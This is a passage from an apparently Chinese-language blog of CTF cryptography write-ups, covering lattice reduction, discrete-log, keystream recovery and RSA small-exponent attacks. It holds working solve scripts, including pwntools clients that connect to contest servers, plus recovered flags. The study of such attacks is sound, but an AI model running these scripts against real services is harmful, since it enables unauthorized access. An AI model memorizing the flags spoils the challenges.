a2 = crt([a12, a22], [p, q])$ $b = a_1 \\cdot a_2^{-1} mod \\ n$ 分析由$c = m \\cdot b + r (mod \\ n)$可以得到$c = m \\cdot b + r + \\mu n$ 移项有$c - m \\cdot b - \\mu n = r$ 考虑到$m,r$都是未知的, 而且都是400位以下, 尝试构造格子将$m,r$规约出来 这里的式子左边有三个项, 所以构造一个3维的格子 因为是三维的格子, 所以最短向量的大小大概是$det(\\mathcal L)^{1/3}$ 而$m,r \\leq 2^{400}$, 所以需要将格子的$Det$放大一点$$\\begin{pmatrix}2^{200}&amp;0&amp;c\\\\0&amp;1&amp;-b\\\\0&amp;0&amp;-n\\end{pmatrix}$$那么会有$$(1 ,m,\\mu)\\begin{pmatrix}2^{200}&amp;0&amp;c\\\\0&amp;1&amp;-b\\\\0&amp;0&amp;-n\\end{pmatrix}=(2^{200},m,r)$$即,存在一个格点$(2^{200},m,r)$, 用LLL规约即可 1234567891011n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361b = 65473938578022920848984901484624361251869406821863616908777213906525858437236185832214198627510663632409869363143982594947164139220013904654196960829350642413348771918422220404777505345053202159200378935309593802916875681436442734667249049535670986673774487031873808527230023029662915806344014429627710399196c = 64666354938466194052720591810783769030566504653409465121173331362654665231573809234913985758725048071311571549777481776826624728742086174609897160897118750243192791021577348181130302572185911750797457793921069473730039225991755755340927506766395262125949939309337338656431876690470938261261164556850871338570v1 = vector(ZZ, [2^200, 0,c])v2 = vector(ZZ, [0, 1,-b])v3 = vector(ZZ, [0, 0,-n])Lattice = matrix([v1,v2,v3])m = abs(Lattice.LLL()[0][1])from hashlib import sha256print( &#x27;d3ctf&#123;%s&#125;&#x27; % sha256(m).hexdigest()) 注意到实际格约出来的向量是全负的, 因为$(-2^{200},-m,-r)$也在格子里面, 所以记得加个abs() 预期解这次的题第一题如果不是做的预期解那么第二题就会特别的难, 所以也顺便学习了一下预期解的做法(出题人预期了非预期解 如果不从$c = b \\cdot m + r (mod \\ n)$入手的话, 就先看看前面几个参数的关系$$\\begin{array}{}a_1 \\equiv a_{11} \\ (mod \\ p)\\\\a_1 \\equiv a_{21} \\ (mod \\ q)\\\\\\end{array}\\quad\\begin{array}{}a_2 \\equiv a_{12} \\ (mod \\ p)\\\\a_2 \\equiv a_{22} \\ (mod \\ q)\\\\\\end{array}\\quadb \\equiv a_1 \\cdot a_2^{-1} \\ (mod \\ n)$$上面这三个式子, 可以得到这么一个方程组$$\\begin{array}{}a_{12} \\cdot b = a_{11} + k_1p \\\\a_{22} \\cdot b = a_{21} + k_2q\\end{array}$$做到这里的时候, 有想过把方程组的两个式子相乘, 得到的会是$$a_{12}a_{22}b^2 = a_{11}a_{21} + k_2a_{11}q + k_1a_{21}p + k_1k_2pq$$但是这里已知的量只有$b,pq$, 也就是说在这个式子里, 有三项一个已知的都没有, 这样是没办法造格子的, 到这里就卡住了, 不得不翻看wp, 才发现, 原来可以把$a_{11}, a_{21}$移到左边再相乘, 这样就只有一个项是未知的了!$$\\begin{array}{}a_{12} \\cdot b - a_{11} = k_1p \\\\a_{22} \\cdot b - a_{21} = k_2q\\end{array}\\Rightarrowa_{12}a_{22}b^2 - b(a_{12}a_{21} + a_{11}a_{22}) + a_{11}a_{21} = k_1k_2pq$$记$K = k_1k_2,n = pq$再移一下项$$a_{12}a_{22}b^2 - b(a_{12}a_{21} + a_{11}a_{22}) - Kn = -a_{11}a_{21}$$然后就是喜闻乐见的造格子$$(a_{12}a_{22}, -(a_{12}a_{21}+a_{11}a_{22}), -K)\\begin{pmatrix}1&amp;0&amp;b^2\\\\0&amp;-1&amp;b\\\\0&amp;0&amp;n\\end{pmatrix}=(a_{12}a_{22}, a_{12}a_{21}+a_{11}a_{22}, -a_{11}a_{21})$$可以看到右侧的向量长度很短, 可以规约出来 1(1173142580751247504024100371706709782500216511824162516724129,1382843159437215516163973075066558157591473749635266665605630,-211380743487233628797755584958526337321408979158793229985661) 因为四个$a$都是100位的素数, 直接用http://www.factordb.com分解$$1018979931854255696816714991181\\\\1151291153120610849180830073509\\\\207806651167586080788016046729\\\\1017199123798810531137951821909$$因为$gcd(a_{12} \\cdot b - a_{11} , n) = p$, 猜一下上面四个数哪两个是$a_{12},a_{11}$就可以得到$p$了, 得到$p$就可以分解$n$, 直接得到所有的参数, 跑解密算法就可以得到明文了 simpleGroup这题比赛的时候也没做出来(第一题都做不出怎么做这题), 比完赛做了第一题才做这题啊啊啊但是因为太久没做次幂的运算导致做了好久……. problem12345678910111213141516171819202122from random import randintfrom secret import FLAG# A gift for key recovery in challenge [babyLattice]n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487M = int.from_bytes(FLAG, &#x27;big&#x27;)C = []while M != 0: m = M % e M //= e r = randint(0, n-1) c = power_mod(y, m, n) * power_mod(r, e, n) C.append(c % n)print(f&quot;C = &#123;C&#125;&quot;)&quot;&quot;&quot;C = [63173987757788284988620600191109581820396865828379773315280703314093571300861961873159324234626635582246705378908610341772657840682572386153960342976445563045427986000105931341168525422286612417662391801508953619857648844420751306271090777865836201978470895906780036112804110135446130976275516908136806153488, 9763526786754236516067080717710975805995955013877681492195771779269768465872108434027813610978940562101906769209984501196515248675767910499405415921162131390513502065270491854965819776080041506584540996447044249409209699608342257964093713589580983775580171905489797513718769578177025063630080394722500351718, 37602000735227732258462226884765737048138920479521815995321941033382094711120810035265327876995207117707635304728511052367297062940325564085193593024741832905771507189762521426736369667607865137900432117426385504101413622851293642219573920971637080154905579082646915297543490131171875075081464735374022745371, 1072671768043618032698040622345664216689606325179075270470875647188092538287671951027561894188700732117175202207361845034630743422559130952899064461493359903596018309221581071025635286144053941851624510600383725195476917014535032481197737938329722082022363122585603600777143850326268988298415885565240343957, 27796821408982345007197248748277202310092789604135169328103109167649193262824176309353412519763498156841477483757818317945381469765077400076181689745139555466187324921460327576193198145058918081061285618767976454153221256648341316332169223400180283361166887912012807743326710962143011946929516083281306203120, 27578857139265869760149251280906035333246393024444009493717159606257881466594628022512140403127178174789296810502616834123420723261733024810610501421455454191654733275226507268803879479462533730695515454997186867769363797096196096976825300792616487723840475500246639213793315097434400920355043141319680299224, 29771574667682104634602808909981269404867338382394257360936831559517858873826664867201410081659799334286847985842898792091629138292008512383903137248343194156307703071975381090326280520578349920827357328925184297610245746674712939135025013001878893129144027068837197196517160934998930493581708256039240833145, 33576194603243117173665354646070700520263517823066685882273435337247665798346350495639466826097821472152582124503891668755684596123245873216775681469053052037610568862670212856073776960384038120245095140019195900547005026888186973915360493993404372991791346105083429461661784366706770467146420310246467262823, 5843375768465467361166168452576092245582688894123491517095586796557653258335684018047406320846455642101431751502161722135934408574660609773328141061123577914919960794180555848119813522996120885320995386856042271846703291295871836092712205058173403525430851695443361660808933971009396237274706384697230238104, 61258574367240969784057122450219123953816453759807167817741267194076389100252707986788076240792732730306129067314036402554937862139293741371969020708475839483175856346263848768229357814022084723576192520349994310793246498385086373753553311071932502861084141758640546428958475211765697766922596613007928849964, 13558124437758868592198924133563305430225927636261069774349770018130041045454468021737709434182703704611453555980636131119350668691330635012675418568518296882257236341035371057355328669188453984172750580977924222375208440790994249194313841200024395796760938258751149376135149958855550611392962977597279393428]&quot;&quot;&quot; 分析$n$ 用的还是第一题的, 所以第一题分解出来的$p,q$这题就有用了 加密的式子大概是$c_i = y^{m_i} \\cdot r^{e} \\ (mod \\ n)$ ,$c,y,e$都是已知的, 而且$m_i &lt; e$ 因为$r$是不知道的, 肯定要想办法消去$r$ , (有的师傅不消去$r$也可以做, 待会下面补充一下) 这里的$e$比较特殊, $gcd(e, (p-1)(q-1)) =e $ 这意味着我们可以直接计算一个$d = {phi \\over e}$, 使得$r^{ed} = r^{phi} = 1 (mod \\ n)$, 欧拉定理yyds 加密的式子两边来个$d$次幂, 就会有$$c_i^d = y^{md} \\ (mod \\ n)$$做到这里想把$d$消去再用bsgs求离散对数, 但因为$d \\ mod \\ phi$没有逆元卡了好久, 真的蠢… 这里$y$是已知的, 直接看成$c_i^d = (y^{d})^m \\ (mod \\ n)$, 用bsgs就完事了(用bsgs是因为m的范围是已知的) exp123456789101112131415161718192021222324252627282930from random import randintn=69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487C = [...]a11 = 207806651167586080788016046729a12 = 1151291153120610849180830073509p = gcd(b * a12 - a11,n)q = n // pphi = (p-1) * (q-1)M = []assert gcd(e,phi) == ed = phi // eassert pow(pow(randint(0,n-1),e,n),d,n) == 1bounds = ( 1,e )F = IntegerModRing(n)for i in C: cd = pow(i,d,n) yd = pow(y,d,n) M.append(bsgs(F(yd),F(cd),bounds))flag = 0for i in M[::-1]: flag = int(flag) * int(e) + int(i)from Crypto.Util.number import long_to_bytesprint(long_to_bytes(flag)) 不用消去$r$的解https://www.anquanke.com/post/id/233827#h2-4, 这位师傅做的 一样先看一下加密的式子$c = y^{m} \\cdot r^{e} \\ (mod \\ n)$ 这题有一个特殊的点就是$e$可以被分解为$e_1$和$e_2$两个素数，这两个素数又分别是$p-1$和$q-1$的因子 所以会有$$m = i \\cdot e_1 + j \\\\c \\equiv y^{j} \\cdot (y^{i} \\cdot r^{e_2})^{e_1} \\ (mod \\ p) \\\\c’ \\equiv c \\cdot y^{-j} \\equiv (y_i \\cdot r^{e_2})^{e_1} \\ (mod \\ p)$$因为$j$是一个比较小的数, 可以通过遍历$j$, 再判断$c \\cdot y^{-j}$是否是$p$的$e_1$次剩余, 就可以得到$m \\ mod \\ e_1$ 同理我们也可以得到$m \\ mod \\ e_2$ 再通过中国剩余定理就能得到$m$了 这里有个素数模的$n$次剩余的判断方法, 很简单, $x$ 为模$p$的$n$次剩余的充要条件为$$x^{p-1} \\equiv 1 \\ (mod \\ p)$$ exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152from Crypto.Util.number import *import gmpy2p = 7669036313101194621345265255994200133006921565596653797956940811601516306410232120057637504305295677357422367597831138570269733177579895994340511712373309q = 9102122415165681824420871673621781250311822805618731863628192549895693024247220594372897360668046264863189831887100676431439200352775676467952192600956629n = 69804507328197961654128697510310109608046244030437362639637009184945533884294737870524186521509776189989451383438084507903660182212556466321058025788319193059894825570785105388123718921480698851551024108844782091117408753782599961943040695892323702361910107399806150571836786642746371968124465646209366215361y = 12064801545723347322936991186738560311049061235541031580807549422258814170771738262264930441670708308259694588963224372530498305648578520552038029773849342206125074212912788823834152785756697757209804475031974445963691941515756901268376267360542656449669715367587909233618109269372332127072063171947435639328e = 1928983487e1 = 36493e2 = 52859def GCRT(mi, ai): assert (isinstance(mi, list) and isinstance(ai, list)) curm, cura = mi[0], ai[0] for (m, a) in zip(mi[1:], ai[1:]): d = gmpy2.gcd(curm, m) c = a - cura assert (c % d == 0) K = c // d * gmpy2.invert(curm // d, m // d) cura += curm * K curm = curm * m // d cura %= curm return (cura % curm, curm) def check(d,p,n): if((p - 1) % n == 0): return pow(d,(p - 1) // n,p) == 1 else: k = gmpy2.gcd(n, p - 1) return pow(d,(p - 1) // k,p) == 1def getM(c,e,p): for i in range(2,e): tmpc = (c * gmpy2.invert(pow(y,i,p),p)) % p if check(tmpc,p,e): return i exit(0)C = [...]m = 0for c in C[::-1]: cp = c % p cq = c % q m1 = getM(cp,e1,p) m2 = getM(cq,e2,q) mm,lcm = GCRT([e1,e2],[m1,m2]) print(&quot;Get mm: &quot; + hex(mm)) m *= e m += mmflag = long_to_bytes(m)print(flag) 后记这题一点都不难, 做了那么久完全就是脑子没转过来… 耗子尾汁, 好好反思 AliceWantFlag studying~ EasyCurve studying~","tags":[{"name":"Crypto","slug":"Crypto","permalink":"http://tearsjin.github.io/tags/Crypto/"},{"name":"Lattice","slug":"Lattice","permalink":"http://tearsjin.github.io/tags/Lattice/"},{"name":"WriteUp","slug":"WriteUp","permalink":"http://tearsjin.github.io/tags/WriteUp/"}]},{"title":"writeup for 2020 starCTF Crypto","date":"2021-01-18T01:28:15.000Z","path":"2021/01/18/writeup-for-2020-starCTF/","text":"总之就是吃老本总之就是曲线好难这次就差一道MyCurve…找个师傅学习学习再补充这个 Crypto MyEnc GuessKey2 little case MyCurve MyEncnc 52.163.228.53 8081附件: 12345678910111213141516171819202122232425from Crypto.Util.number import getPrime,bytes_to_longimport time,urandomfrom flag import flagiv=bytes_to_long(urandom(256))assert len(flag)==15keystream=bin(int(flag.encode(&#x27;hex&#x27;),16))[2:].rjust(8*len(flag),&#x27;0&#x27;)p=getPrime(1024)q=getPrime(1024)n=p*qprint &quot;n:&quot;,ncnt=0while True: try: print &#x27;give me a number:&#x27; m=int(raw_input()) except: break ct=iv for i in range(1,8): if keystream[cnt]==&#x27;1&#x27;: ct+=pow(m^q,i**i**i,n) ct%=n cnt=(cnt+1)%len(keystream) print &quot;done:&quot;,ct stream cipher的味道flag 即 keystream 共120位每次输入一个m , 根据key的7位返回一个ct第1个m对应key的06第2个m对应key的713…第17个m对应key的112118第18个m对应key的1195…120个m则会回到刚开始一样 而重复传同样的m的时候, 如果取key的7位是相同的, 那么返回的ct也是相同的, 根据这个特点, 重复传120个m=0, 可以得到一些返回相同ct的7位, 也就是key里面相同的两个7位 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *from hashlib import sha256import reprintable = &#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;con = remote(&#x27;52.163.228.53&#x27;, 8081)def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start + END).encode()).hexdigest() if ensha == SHA: print(start) return start.encode()resp = con.recvuntil(&#x27;xxxx:&#x27;).decode()END = re.findall(r&#x27;xxxx\\+(.*)\\) ==&#x27;, resp)[0]SHA = re.findall(r&#x27;== (.*)&#x27;, resp)[0]print(resp)resp = con.recv().decode()print(resp)con.sendline(proof(END, SHA))resp = con.recvuntil(&#x27;number:&#x27;).decode()print(resp)arr = []for _ in range(120): con.sendline(&#x27;0&#x27;.encode()) resp = con.recvuntil(&#x27;number:&#x27;).decode() num = int(resp[6:-17]) if num not in arr: arr.append(num) else: arr.append(-1) print(_, arr.index(num)) 得到的输出为: 12345678910111213141516171819202122232425262728293031323334353615 1226 1432 137 943 3152 5154 1460 4869 5871 3176 3977 6580 881 3882 4885 6386 3188 4890 792 1793 5694 296 6498 7099 0100 12103 48104 12105 65106 49110 73112 72114 78115 87117 29118 83 第一行的15 12代表着, key的15* 715* 7+6 == 12* 712* 7+6也就是key[105:112] == key[84:91]每一行都能构造出这么一个等式 根据所有等式, 可以将后面的一些位数用前面的位数表示(他们都是相等的) 12345678910111213141516arr = [15, 12, 26, 14, 32, 1, 37, 9, 43, 31, 52, 51, 54, 14, 60, 48, 69, 58, 71, 31, 76, 39, 77, 65, 80, 8, 81, 38, 82, 48, 85, 63, 86, 31, 88, 48, 90, 7, 92, 17, 93, 56, 94, 2, 96, 64, 98, 70, 99, 0, 100, 12, 103, 48, 104, 12, 105, 65, 106, 49, 110, 73, 112, 72, 114, 78, 115, 87, 117, 29, 118, 83]key = [i for i in range(120)]for _ in range(1000): for i in range(0, len(arr), 2): for (j, k) in zip(range((arr[i + 1] * 7), (arr[i + 1] * 7 + 7)), range((arr[i] * 7), (arr[i] * 7 + 7))): if key[j % 120] &lt; key[k % 120]: key[k % 120] = key[j % 120] else: key[j % 120] = key[k % 120]print(key) 然后! 就能把key还原成: 1[0, 0, 2, 0, 2, 0, 2, 0, 0, 2, 0, 0, 0, 0, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 0, 0, 0, 2, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 40, 41, 42, 43, 2, 0, 0, 2, 0, 2, 0, 0, 2, 34, 35, 36, 0, 2, 2, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 2, 2, 2, 0, 0, 2, 2, 0, 0, 0, 0, 0, 2, 2, 2, 0, 2, 0, 0, 0, 0, 2, 2, 0, 0, 0, 2, 0, 2, 0, 2, 0, 2, 0, 0, 0, 0, 2, 0, 0, 0, 0, 2, 0, 113, 114, 2, 2, 2, 0, 2] 0和2分别代表着1或者0(不确定是0对应1还是2对应1而其他的比较大的数则是未知的, 一共12位,所以只需要爆破2^12次, 然后再猜一下0对应的是1还是0这里直接猜0对应0, 中啦! 1234567891011121314151617for i in range(len(key)): if key[i] == 0: key[i] = &#x27;0&#x27; elif key[i] == 2: key[i] = &#x27;1&#x27; else: key[i] = &#x27;&#123;&#125;&#x27;key = &#x27;&#x27;.join(key)from MyCrypto.Conversion import bin2textfor i in range(2 ** 12): pad = bin(i)[2:].zfill(12) keystream = key.format(pad[0], pad[1], pad[2], pad[3], pad[4], pad[5], pad[6], pad[7], pad[8], pad[9], pad[10], pad[11]) flag = bin2text(keystream) if flag[0] == &#x27;*&#x27; and flag[-1] == &#x27;&#125;&#x27; and &#x27;&#123;&#x27; in flag: print(flag) 得到的输出: 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128*CTF&#123; HuG0t1T!&#125;*CTF&#123; IuG0t1T!&#125;*CTF&#123; JuG0t1T!&#125;*CTF&#123; KuG0t1T!&#125;*CTF&#123; LuG0t1T!&#125;*CTF&#123; MuG0t1T!&#125;*CTF&#123; NuG0t1T!&#125;*CTF&#123; OuG0t1T!&#125;*CTF&#123;\u0019HuG0t1T!&#125;*CTF&#123;\u0019IuG0t1T!&#125;*CTF&#123;\u0019JuG0t1T!&#125;*CTF&#123;\u0019KuG0t1T!&#125;*CTF&#123;\u0019LuG0t1T!&#125;*CTF&#123;\u0019MuG0t1T!&#125;*CTF&#123;\u0019NuG0t1T!&#125;*CTF&#123;\u0019OuG0t1T!&#125;*CTF&#123;)HuG0t1T!&#125;*CTF&#123;)IuG0t1T!&#125;*CTF&#123;)JuG0t1T!&#125;*CTF&#123;)KuG0t1T!&#125;*CTF&#123;)LuG0t1T!&#125;*CTF&#123;)MuG0t1T!&#125;*CTF&#123;)NuG0t1T!&#125;*CTF&#123;)OuG0t1T!&#125;*CTF&#123;9HuG0t1T!&#125;*CTF&#123;9IuG0t1T!&#125;*CTF&#123;9JuG0t1T!&#125;*CTF&#123;9KuG0t1T!&#125;*CTF&#123;9LuG0t1T!&#125;*CTF&#123;9MuG0t1T!&#125;*CTF&#123;9NuG0t1T!&#125;*CTF&#123;9OuG0t1T!&#125;*CTF&#123;IHuG0t1T!&#125;*CTF&#123;IIuG0t1T!&#125;*CTF&#123;IJuG0t1T!&#125;*CTF&#123;IKuG0t1T!&#125;*CTF&#123;ILuG0t1T!&#125;*CTF&#123;IMuG0t1T!&#125;*CTF&#123;INuG0t1T!&#125;*CTF&#123;IOuG0t1T!&#125;*CTF&#123;YHuG0t1T!&#125;*CTF&#123;YIuG0t1T!&#125;*CTF&#123;YJuG0t1T!&#125;*CTF&#123;YKuG0t1T!&#125;*CTF&#123;YLuG0t1T!&#125;*CTF&#123;YMuG0t1T!&#125;*CTF&#123;YNuG0t1T!&#125;*CTF&#123;YOuG0t1T!&#125;*CTF&#123;iHuG0t1T!&#125;*CTF&#123;iIuG0t1T!&#125;*CTF&#123;iJuG0t1T!&#125;*CTF&#123;iKuG0t1T!&#125;*CTF&#123;iLuG0t1T!&#125;*CTF&#123;iMuG0t1T!&#125;*CTF&#123;iNuG0t1T!&#125;*CTF&#123;iOuG0t1T!&#125;*CTF&#123;yHuG0t1T!&#125;*CTF&#123;yIuG0t1T!&#125;*CTF&#123;yJuG0t1T!&#125;*CTF&#123;yKuG0t1T!&#125;*CTF&#123;yLuG0t1T!&#125;*CTF&#123;yMuG0t1T!&#125;*CTF&#123;yNuG0t1T!&#125;*CTF&#123;yOuG0t1T!&#125;*CTF&#123;HuG0t1T!&#125;*CTF&#123;IuG0t1T!&#125;*CTF&#123;JuG0t1T!&#125;*CTF&#123;KuG0t1T!&#125;*CTF&#123;LuG0t1T!&#125;*CTF&#123;MuG0t1T!&#125;*CTF&#123;NuG0t1T!&#125;*CTF&#123;OuG0t1T!&#125;*CTF&#123;HuG0t1T!&#125;*CTF&#123;IuG0t1T!&#125;*CTF&#123;JuG0t1T!&#125;*CTF&#123;KuG0t1T!&#125;*CTF&#123;LuG0t1T!&#125;*CTF&#123;MuG0t1T!&#125;*CTF&#123;NuG0t1T!&#125;*CTF&#123;OuG0t1T!&#125;*CTF&#123;©HuG0t1T!&#125;*CTF&#123;©IuG0t1T!&#125;*CTF&#123;©JuG0t1T!&#125;*CTF&#123;©KuG0t1T!&#125;*CTF&#123;©LuG0t1T!&#125;*CTF&#123;©MuG0t1T!&#125;*CTF&#123;©NuG0t1T!&#125;*CTF&#123;©OuG0t1T!&#125;*CTF&#123;¹HuG0t1T!&#125;*CTF&#123;¹IuG0t1T!&#125;*CTF&#123;¹JuG0t1T!&#125;*CTF&#123;¹KuG0t1T!&#125;*CTF&#123;¹LuG0t1T!&#125;*CTF&#123;¹MuG0t1T!&#125;*CTF&#123;¹NuG0t1T!&#125;*CTF&#123;¹OuG0t1T!&#125;*CTF&#123;ÉHuG0t1T!&#125;*CTF&#123;ÉIuG0t1T!&#125;*CTF&#123;ÉJuG0t1T!&#125;*CTF&#123;ÉKuG0t1T!&#125;*CTF&#123;ÉLuG0t1T!&#125;*CTF&#123;ÉMuG0t1T!&#125;*CTF&#123;ÉNuG0t1T!&#125;*CTF&#123;ÉOuG0t1T!&#125;*CTF&#123;ÙHuG0t1T!&#125;*CTF&#123;ÙIuG0t1T!&#125;*CTF&#123;ÙJuG0t1T!&#125;*CTF&#123;ÙKuG0t1T!&#125;*CTF&#123;ÙLuG0t1T!&#125;*CTF&#123;ÙMuG0t1T!&#125;*CTF&#123;ÙNuG0t1T!&#125;*CTF&#123;ÙOuG0t1T!&#125;*CTF&#123;éHuG0t1T!&#125;*CTF&#123;éIuG0t1T!&#125;*CTF&#123;éJuG0t1T!&#125;*CTF&#123;éKuG0t1T!&#125;*CTF&#123;éLuG0t1T!&#125;*CTF&#123;éMuG0t1T!&#125;*CTF&#123;éNuG0t1T!&#125;*CTF&#123;éOuG0t1T!&#125;*CTF&#123;ùHuG0t1T!&#125;*CTF&#123;ùIuG0t1T!&#125;*CTF&#123;ùJuG0t1T!&#125;*CTF&#123;ùKuG0t1T!&#125;*CTF&#123;ùLuG0t1T!&#125;*CTF&#123;ùMuG0t1T!&#125;*CTF&#123;ùNuG0t1T!&#125;*CTF&#123;ùOuG0t1T!&#125; 还好小学读过英语, 根据语义猜测flag在*CTF&#123;YOuG0t1T!&#125;和*CTF&#123;yOuG0t1T!&#125;之中 猜猜是哪个呀 GuessKey2 关于出题人忘记把key注释掉多了一题GuessKey2那件事 nc 52.163.228.53 8080附件 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748from random import randintimport osfrom flag import flagN=64key=randint(0,2**N)print keykey=bin(key)[2:].rjust(N,&#x27;0&#x27;)count=0while True: p=0 q=0 new_key=&#x27;&#x27; zeros=[0] for j in range(len(key)): if key[j]==&#x27;0&#x27;: zeros.append(j) p=zeros[randint(0,len(zeros))-1] q=zeros[randint(0,len(zeros))-1] try: mask=int(raw_input(&quot;mask:&quot;)) except: exit(0) mask=bin(mask)[2:] if p&gt;q: tmp=q q=p p=tmp cnt=0 for j in range(0,N): if j in range(p,q+1): new_key+=str(int(mask[cnt])^int(key[j])) else: new_key+=key[j] cnt+=1 cnt%=len(mask) key=new_key try: guess=int(raw_input(&quot;guess:&quot;)) except: exit(0) if guess==int(key,2): count+=1 print &#x27;Nice.&#x27; else: count=0 print &#x27;Oops.&#x27; if count&gt;2: print flag 随机生成一个key, 输入mask, 每一轮都会随机的在key中取一段(开头结尾两位必定都是0), 然后与mask对应的一段异或(mask先重复填充成key长度). 题目让我们猜每一轮的key, 连续猜中3轮就能得到flag 可以看到只有输入mask才能改变key, 想到key中拿来跟mask异或的第一位必定是0, 如果最前面的0被改成了1, 那么它前面的位数和它本身就再也不会改变了, 利用这个特点, 可以疯狂传mask=1,让key的所有位数变成1, 当key变成全1之后, 传mask=0就能保持key不变了, 一直传guess=int(&#39;1&#39;*64,2)就行了 12345678910111213141516171819202122232425262728293031from random import randintfrom pwn import *mask = &#x27;1&#x27;key = &#x27;1&#x27;*64mask = str(int(mask,2))key = str(int(key,2))print(mask)print(key)con = remote(&#x27;52.163.228.53&#x27;, 8082)resp = con.recv().decode()print(resp)i = 0while True: con.sendline(mask.encode()) resp = con.recv().decode() con.sendline(key.encode()) resp = con.recvuntil(&#x27;mask:&#x27;).decode() print(resp) if &#x27;e&#x27; in resp: for _ in range(3): con.sendline(&#x27;0&#x27;.encode()) resp = con.recv().decode() con.sendline(key.encode()) resp = con.recvuntil(&#x27;mask:&#x27;).decode() print(resp) break i += 1 print(i) 大概跑个一两百轮?就能出结果了 1*CTF&#123;27d30dad45523cbf88013674a4b5bd29&#125; little case 总会有一道RSA的对吧? 附件: 1234567891011121314151617181920212223242526272829303132333435363738from Crypto.Util.number import *from libnum import *from secret import flag,special,p,q,ndef little_trick(msg): p1 = getPrime(1024) q1 = getPrime(1024) n1 = p1 * q1 d1=random.randint(1,2**256) e1=inverse(d1,(p1-1)*(q1-1)) print(n1) print(e1) print(pow(msg,e1,n1))def real_trick(): assert (special &gt; (ord(&quot;*&quot;)*100) and gcd(special,(p-1)*(q-1))!=1 ) print(n) print(pow(libnum.s2n(flag),special,n))if __name__ == &#x27;__main__&#x27;: little_trick(p-1) real_trick()&#x27;&#x27;&#x27;输出2166969987538734397576548483417596246134883737144702469545847915461534869733094456671458721785288870229136830663797709549095319270145012779867042595976811838491508201737395131569989900963183447169181181539378474893088095411444674581405813275289782771707788654791147657575125487262392778367025296999507562925554162191776750126124919265354687510453264904321969761646420577202526701932836434976385465949014453108734997446907925523682309641509455203748827775292757990953940131162467144483333261817751335617353757328035272438437637295510003153423681668180539660814764700365362820325868109755204911430836796796718411683956120717541468269984768938524534679430706714860712589983300712432366828367981392533792814384884126053081363266457682162675931547901815985830455612301105504518353600255693451085179954519939635263372257973143178677586338992274607959326361412487748088349413448526455377296931144384663805056580662706419414607407821761761574754611275621927387380065975844282519447660467416826579669726178901884060454994606177784839804528666823956703141147239309978420776148158425922031573513062568162012505209805669623841355103885621402814626329355281853436655713194649170570579414480803671531927080535374958180810697826214794117466378050607176539138222652920461404360773520273885180129341784970598507030048392686221756661237287565905053442793955466822625315468413910881083476950910279105441128302707221794807868597032254219726690214064954521070071544267307987529121635533324469290490574646122678700124382684589146521293911502179320769468863012941550317042792225948425851236718711188795749464241383917033088697531544976656307993001386513048352057551779401166808211428589238421242945296407196294978535989149630746563193256642101047882019579458019902966045857218200463914392352869510880869662530389895867373524679054011076137634873020705462472824066644317774752234608703633137996819211838940304756844580541488194897851858027702702748628429341509762301122850696807175370925635224673318130451371300309661526661336508090976060549801733008596069960777736142956237612437634021542639879792016801613783056356463692225721506626607549462578294397385749078191669411818709478603479243778196460108984354999593988793941076335033865890110802065847595648939130052869128960414959872080301237176577092821104475562604581705387080304086372245855492407601115169556714797690305399391485971463183775543559200698659800620769259901902664475357585338281026191033219744738672741960607394864523837759571912732299056226934743176360461051108799706450051853623472248552066649321279227693844417404789169416642586313895494292082308084823101092675162498154181999270703392144766031531668783213589136974486867571090321426005719333327425286160436925591205840653712046866950957876967715226097699016798471712274797888761218915345301238306497841970203137048433491914195023230951832644259526895087301990301002618450573323078919808182376666320244077837033894089805640452791930176084416087344594957596135877833163152566525019063919662459299054294655118065279192807949989681674190983739625056255497842063989284921411358232926435537518406&#x27;&#x27;&#x27; 一共两个问题吧 根据n1,e1以及pow(p-1,e1,n1)求p-1 根据上面的p, n 还有一些e有关的条件, 求flag 根据n1,e1以及pow(p-1,e1,n1)求p-1e1够大, 直接上Boneh_Durfee, 直接拿github上面的脚本跑了(不想改了…. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331import time############################################# Config##########################################&quot;&quot;&quot;Setting debug to true will display more informationsabout the lattice, the bounds, the vectors...&quot;&quot;&quot;debug = False&quot;&quot;&quot;Setting strict to true will stop the algorithm (andreturn (-1, -1)) if we don&#x27;t have a correct upperbound on the determinant. Note that this doesn&#x27;t necesseraly mean that no solutions will be found since the theoretical upperbound isusualy far away from actual results. That is whyyou should probably use `strict = False`&quot;&quot;&quot;strict = 